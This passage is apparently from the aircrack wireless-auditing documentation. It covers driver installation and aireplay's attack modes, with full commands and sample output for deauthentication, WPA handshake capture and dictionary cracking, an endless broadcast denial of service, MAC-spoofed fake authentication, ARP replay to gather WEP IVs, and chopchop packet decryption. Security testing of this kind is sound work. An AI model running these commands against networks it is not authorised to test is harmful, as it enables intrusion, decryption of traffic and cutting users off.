      + Installing the rt2570 driver (Ralink b/g USB)

        ifconfig rausb0 down
        rmmod rt2570

        cd /usr/src
        wget http://100h.org/wlan/linux/ralink/rt2570-cvs-20051112.tgz
        tar -xvzf rt2570-cvs-20051112.tgz
        cd rt2570-cvs-20051112
        cd Module
        make && make install
        modprobe rt2570


The driver won't compile.

    This usually happens because the linux headers don't match your current
    running kernel. In this situation, just recompile a fresh kernel, install
    it and reboot. Then, try again compiling the driver.

    See this HOWTO for more details about kernel compilation.

How do I use aireplay ?

    If the driver was properly patched, aireplay is able to inject raw 802.11
    packets in Monitor mode; it currently implements a set of five different
    attacks.

    If you get "ioctl(SIOCGIFINDEX) failed: No such device", double check that
    your device name is correct and that you haven't forgotten a parameter on
    the command line.

    In the following examples, 00:13:10:30:24:9C is the MAC address of the
    access point (on channel 6), and 00:09:5B:EB:C5:2B is the MAC address of a
    wireless client.

      + Attack 0: deauthentication

        This attack is mostly useful to recover a hidden (not broadcasted)
        ESSID and for capturing WPA handshakes by forcing clients to
        reauthenticate. It can also be used to generate ARP requests as Windows
        clients sometimes flush their ARP cache when disconnected. Of course,
        this attack is totally useless if there are no associated wireless
        clients.

        It is usually more effective to target a specific station using the -c
        parameter.

        Some examples:

          o WPA Handshake capture with an Atheros

            airmon.sh start ath0
            airodump ath0 out 6  (switch to another console)
            aireplay -0 5 -a 00:13:10:30:24:9C -c 00:09:5B:EB:C5:2B ath0
            (wait for a few seconds)
            aircrack -w /path/to/dictionary out.cap

          o ARP request generation with a Prism2 card

            airmon.sh start wlan0
            airodump wlan0 out 6  (switch to another console)
            aireplay -0 10 -a 00:13:10:30:24:9C wlan0
            aireplay -3 -b 00:13:10:30:24:9C -h 00:09:5B:EB:C5:2B wlan0

            After sending the five batches of deauthentication packets, we
            start listening for ARP requests with attack 3. The -h option is
            mandatory and has to be the MAC address of an associated client.

            If the driver is wlan-ng, you must run the airmon.sh script;
            otherwise the card won't be correctly setup for injection.

          o Mass denial-of-service with a RT2500 card

            airmon.sh start ra0
            aireplay -0 0 -a 00:13:10:30:24:9C ra0

            With parameter 0, this attack will loop forever sending
            deauthentication packets to the broadcast address, thus preventing
            clients from staying connected.

      + Attack 1: fake authentication

        This attack is only useful when you need an associated MAC address in
        attacks 2, 3, 4 (-h option) and there is currently no associated
        client. However it is genereally better to use the MAC address of a
        real client (like here, 00:09:5B:EB:C5:2B) in attacks 2, 3 and 4. The
        fake auth attack does NOT generate ARP requests.

        Also, subsequent attacks will likely perform better if you update the
        MAC address of the card, so that it properly sends ACKs:

        ifconfig ath0 down
        ifconfig ath0 hw ether 00:11:22:33:44:55
        ifconfig ath0 up

        aireplay -1 0 -e 'the ssid' -a 00:13:10:30:24:9C -h 00:11:22:33:44:55 ath0
        12:14:06  Sending Authentication Request
        12:14:06  Authentication successful
        12:14:06  Sending Association Request
        12:14:07  Association successful :-)

        +---------------------------------------------------------------------+
        | With patched madwifi CVS 2005-08-14, it's possible to inject        |
        | packets while in Managed mode (the WEP key itself doesn't matter,   |
        | as long as the AP accepts Open-System authentication). So, instead  |
        | of running attack 1, you may just associate and inject / monitor    |
        | through the athXraw interface:                                      |
        |                                                                     |
        | ifconfig ath0 down hw ether 00:11:22:33:44:55                       |
        | iwconfig ath0 mode Managed essid 'the ssid' key AAAAAAAAAA          |
        | ifconfig ath0 up                                                    |
        |                                                                     |
        | sysctl -w dev.ath0.rawdev=1                                         |
        | ifconfig ath0raw up                                                 |
        | airodump ath0raw out 6                                              |
        |                                                                     |
        | Then you can run attack 3 or 4 (aireplay will automatically replace |
        | ath0 with ath0raw below):                                           |
        |                                                                     |
        | aireplay -3 -h 00:11:22:33:44:55 -b 00:13:10:30:24:9C ath0          |
        | aireplay -4 -h 00:10:20:30:40:50 -f 1 ath0                          |
        |                                                                     |
        +---------------------------------------------------------------------+

        Some access points require to reassociate every 30 seconds, otherwise
        our fake client is considered disconnected. In this case, setup the
        periodic re-association delay:

        aireplay -1 30 -e 'the ssid' -a 00:13:10:30:24:9C -h 00:11:22:33:44:55 ath0

        If this attacks seems to fail (aireplay keeps sending authentication
        requests), MAC address filtering may be in place. Also make sure that:

          o You are close enough to the access point.
          o The driver is properly patched and installed.
          o The card is configured on the same channel as the AP.
          o The BSSID and ESSID (-a / -e options) are correct.
          o If Prism2, make sure the firmware was updated.

        As a reminder: you can't inject with a Centrino, Hermes, ACX1xx,
        Aironet, ZyDAS, Marvell or Broadcom chipset because of firmware and/or
        driver limitations.

      + Attack 2: interactive packet replay

        This attack allows you to choose a given packet for replaying; it
        sometimes gives more effective results than attack 3 (automatic ARP
        reinjection).

        You could use it, for example, to attempt the "any data re-broadcast"
        attack, which only works if the AP actually reencrypts WEP data
        packets:

        aireplay -2 -b 00:13:10:30:24:9C -n 100 -p 0841 \
            -h 00:09:5B:EB:C5:2B -c FF:FF:FF:FF:FF:FF ath0

        You can also use attack 2 to manually replay WEP-encrypted ARP request
        packets, which size is either 68 or 86 bytes (depending on the
        operating system):

        aireplay -2 -b 00:13:10:30:24:9C -d FF:FF:FF:FF:FF:FF \
            -m 68 -n 68 -p 0841 -h 00:09:5B:EB:C5:2B ath0

        aireplay -2 -b 00:13:10:30:24:9C -d FF:FF:FF:FF:FF:FF \
            -m 86 -n 86 -p 0841 -h 00:09:5B:EB:C5:2B ath0

      + Attack 3: ARP-request reinjection

        The classic ARP-request replay attack is the most effective to generate
        new IVs, and works very reliably. You need either the MAC address of an
        associated client (00:09:5B:EB:C5:2B), of a fake MAC from attack 1
        (00:11:22:33:44:55). You may have to wait for a couple of minutes, or
        even longer, until an ARP request shows up; this attack will fail if
        there is no traffic.

        Please note that you can also reuse ARP requests from a previous
        capture using the -r switch.

        aireplay -3 -b 00:13:10:30:24:9C -h 00:11:22:33:44:55 ath0
        Saving ARP requests in replay_arp-0627-121526.cap
        You must also start airodump to capture replies.
        Read 2493 packets (got 1 ARP requests), sent 1305 packets...

      + Attack 4: KoreK's "chopchop" (CRC prediction)

        This attack, when successful, can decrypt a WEP data packet without
        knowing the key. It can even work against dynamic WEP. This attack does
        not recover the WEP key itself, but merely reveals the plaintext.
        However, most access points are not vulnerable at all. Some may seem
        vulnerable at first but actually drop data packets shorter that 60
        bytes. This attack requires at least one WEP data packet.

         1. First, we decrypt one packet :

            aireplay -4 -h 00:09:5B:EB:C5:2B ath0

         2. Let's have a look at the IP address :

            tcpdump -s 0 -n -e -r replay_dec-0627-022301.cap
            reading from file replay_dec-0627-022301.cap, link-type [...]
            IP 192.168.1.2 > 192.168.1.255: icmp 64: echo request seq 1

         3. Then, forge an ARP request.

            The source IP (192.168.1.100) doesn't matter, but the destination
            IP (192.168.1.2) must respond to ARP requests. The source MAC must
            belong to an associated station.

            ./arpforge replay_dec-0627-022301.xor 1 00:13:10:30:24:9C \
            00:09:5B:EB:C5:2B 192.168.1.100 192.168.1.2 arp.cap

         4. And replay our forged ARP request :

            aireplay -2 -r arp.cap ath0


-------------------------------------------------------------------------------

    Finally, I'd like to thank all the many, many people who contributed to
    aircrack... you know who you are :-)

-------------------------------------------------------------------------------

